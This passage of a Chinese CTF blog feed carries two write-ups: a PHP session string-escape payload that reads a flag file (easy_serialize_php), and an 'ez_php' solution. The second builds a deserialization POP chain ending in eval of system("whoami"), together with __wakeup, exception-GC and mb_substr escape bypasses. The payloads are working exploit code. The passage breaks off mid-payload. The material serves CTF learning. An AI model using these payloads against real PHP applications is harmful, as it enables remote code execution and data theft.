class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> =<span class="hljs-built_in"> filter</span>(serialize(<span class="hljs-variable">$_SESSION</span>));<br></code></pre></td></tr></table></figure><p>这里会将我们传入的$_SESSION全局变量（数组类型）先进行序列化，然后进行过滤函数的过滤，会将</p><p>php、flag、php5、php4、fl1g等值替换为空。</p><p>所以我们可以通过这个过滤函数来实现字符串逃逸</p><hr><p>首先我们先把我们要成功逃逸出来的序列化字符串构造出来</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后我们拿到本地去试一试</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">post：<span class="hljs-variable">_SESSION</span>[user]=;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br><br><span class="hljs-meta">#a:2:&#123;s:4:<span class="hljs-string">&quot;user&quot;</span>;s:40:<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>;s:3:<span class="hljs-string">&quot;img&quot;</span>;s:20:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></code></pre></td></tr></table></figure><p>很明显我们这里要闭合掉前面的这几个字符</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">user<span class="hljs-string">&quot;;s:40:</span><br></code></pre></td></tr></table></figure><p>闭合的字符个数为4，但是这里要闭合11个字符，所以要多增加7个字符</p><p>而phpflag正好7个字符</p><p>在键user的后面添加phpflag</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">post：<span class="hljs-variable">_SESSION</span>[userphpflag]=;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br><br><span class="hljs-meta">#a:2:&#123;s:11:<span class="hljs-string">&quot;user&quot;</span>;s:40:<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>;s:3:<span class="hljs-string">&quot;img&quot;</span>;s:20:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></code></pre></td></tr></table></figure><p>可以看到成功闭合，然后给这个键随便添加一个值即可，这里就添加s:1:”1”</p><p>payload：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">post：<span class="hljs-variable">_SESSION</span>[userphpflag]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br><br><span class="hljs-meta">#a:2:&#123;s:11:<span class="hljs-string">&quot;user&quot;</span>;s:48:<span class="hljs-string">&quot;;s:1:&quot;</span>1<span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="hljs-string">&quot;;&#125;&quot;</span>;s:3:<span class="hljs-string">&quot;img&quot;</span>;s:20:<span class="hljs-string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></code></pre></td></tr></table></figure><hr><p>传入payload：<br><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy_serialize_php1-2.png"></p><p>没显示东西，看看源代码</p><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy_serialize_php1-3.png"></p><p>告诉我们flag在&#x2F;d0g3_fllllllag里。</p><p>首先要把 &#x2F;d0g3_fllllllag 转成base64编码 L2QwZzNfZmxsbGxsbGFn</p><p>构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[userphpflag]=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag</p><p><img src="/../image/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy_serialize_php1-4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php反序列化 </tag>
            
            <tag> 字符串逃逸 </tag>
            
            <tag> extract覆盖函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ez_php</title>
      <link href="/2025/03/28/ez-php/"/>
      <url>/2025/03/28/ez-php/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h1><p>首先先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>(<span class="hljs-string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>].<span class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$pre</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]:<span class="hljs-string">&quot;substr&quot;</span>;<br>    <span class="hljs-variable">$ser_ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$pre</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_ctf</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;杂鱼~杂鱼~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>先构造链子，根据魔术方法的调用方式把链子构造出来</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs zephir">Hacker::__destruct =&gt; C::__toString =&gt; T::__call =&gt; F::__get =&gt; E::__isset =&gt; R::__invoke<br></code></pre></td></tr></table></figure><p>然后就是绕过__wakeup魔术方法</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __wakeup()&#123;<br>    $<span class="hljs-keyword">this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;end = $<span class="hljs-keyword">this</span>-&gt;start;<br>&#125;<br></code></pre></td></tr></table></figure><p>下边有一个赋值的操作，所以可以使用引用绕过，当<code>end</code>和<code>username</code>相互引用时，修改<code>end</code>的值也是在修改<code>username</code>的值</p><p>—。</p><p>接着是绕过<code>throw new Exception(&quot;杂鱼~杂鱼~&quot;);</code>，这里有一个异常抛出，使得<code>__destruct</code>并不能触发，这时就需要使用gc回收的机制，使<code>__destruct</code>提前触发，让<code>pop</code>链能够往后走</p><p>参考连接：<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a></p><hr><p>构造出pop链</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    public <span class="hljs-variable">$start</span>;<br>    public <span class="hljs-variable">$end</span>;<br>    public <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    public function __wakeup()&#123;<br>        <span class="hljs-variable">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable">$this</span>-&gt;end = <span class="hljs-variable">$this</span>-&gt;start;<br>    &#125;<br><br>    public function __destruct()&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            echo <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    public <span class="hljs-variable">$c</span>;<br>    public function __toString()&#123;<br>                echo <span class="hljs-string">&quot;__toString&quot;</span>;<br>        <span class="hljs-variable">$this</span>-&gt;c-&gt;c();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    public <span class="hljs-variable">$t</span>;<br>    public function __call(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span>)&#123;<br>                echo <span class="hljs-string">&quot;__call&quot;</span>;<br>        echo <span class="hljs-variable">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    public <span class="hljs-variable">$f</span>;<br>    public function __get(<span class="hljs-variable">$name</span>)&#123;<br>                echo <span class="hljs-string">&quot;__get&quot;</span>;<br>        <span class="hljs-keyword">return</span> isset(<span class="hljs-variable">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    public <span class="hljs-variable">$e</span>;<br>    public function __isset(<span class="hljs-variable">$name</span>)&#123;<br>                echo <span class="hljs-string">&quot;__isset&quot;</span>;<br>        (<span class="hljs-variable">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    public <span class="hljs-variable">$r</span>;<br><br>    public function __invoke()&#123;<br>                echo <span class="hljs-string">&quot;__invoke&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = new Hacker();<br><span class="hljs-variable">$a</span>-&gt;end = &amp;<span class="hljs-variable">$a</span>-&gt;username;<br><span class="hljs-variable">$a</span>-&gt;start = new C();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c = new T();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t = new F();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f = new E();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e = new R();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r = <span class="hljs-string">&#x27;system(&quot;whoami&quot;);&#x27;</span>;<br><span class="hljs-variable">$b</span>=array(<span class="hljs-string">&#x27;1&#x27;</span>=&gt;<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;2&#x27;</span>=&gt;null);<br>echo serialize(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-regexp">//a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&quot;</span>whoami<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;i:<span class="hljs-number">2</span>;N;&#125;<br></code></pre></td></tr></table></figure><hr><p>然后把末尾的<code>i:2;N;&#125;</code>改成<code>i:1;N;&#125;</code>，即把<code>2</code>改成<code>1</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;system(&quot;</span>whoami<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>特殊变量名，传入<code>ez[ser.from_you</code>即可绕过</p><p>最后是逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>参考 <strong>CTFSHOW-西瓜杯</strong> 的 <strong>Ezzz_php</strong></p><p>参考链接：<a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">ctfshow_XGCTF_西瓜杯</a></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">每发送一个<span class="hljs-meta">%</span>f<span class="hljs-number">0</span>abc，mb_strpos认为是<span class="hljs-number">4</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">3</span>个字节<br>每发送一个<span class="hljs-meta">%</span>f<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">9</span>fab,mb_strpos认为是<span class="hljs-number">3</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">2</span>个字节<br>每发送一个<span class="hljs-meta">%</span>f<span class="hljs-number">0</span><span class="hljs-meta">%</span><span class="hljs-number">9</span>f<span class="hljs-meta">%</span><span class="hljs-number">9</span>fa,mb_strpos认为是<span class="hljs-number">2</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">1</span>个字节<br></code></pre></td></tr></table></figure><p>在本地测试一下，计算我们需要截掉几个字节</p><p>题目正常序列化 <code>serialize($ctf)</code>，得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">O:6:<span class="hljs-string">&quot;Hacker&quot;</span>:3:&#123;s:5:<span class="hljs-string">&quot;start&quot;</span>;s:218:<span class="hljs-string">&quot;&#123;&#123;&#123;a:2:&#123;i:1;O:6:&quot;</span>Hacker<span class="hljs-string">&quot;:3:&#123;s:5:&quot;</span>start<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;O:1:&quot;</span>T<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>t<span class="hljs-string">&quot;;O:1:&quot;</span>F<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>f<span class="hljs-string">&quot;;O:1:&quot;</span>E<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>e<span class="hljs-string">&quot;;O:1:&quot;</span>R<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>r<span class="hljs-string">&quot;;s:17:&quot;</span>system(<span class="hljs-string">&quot;whoami&quot;</span>);<span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span 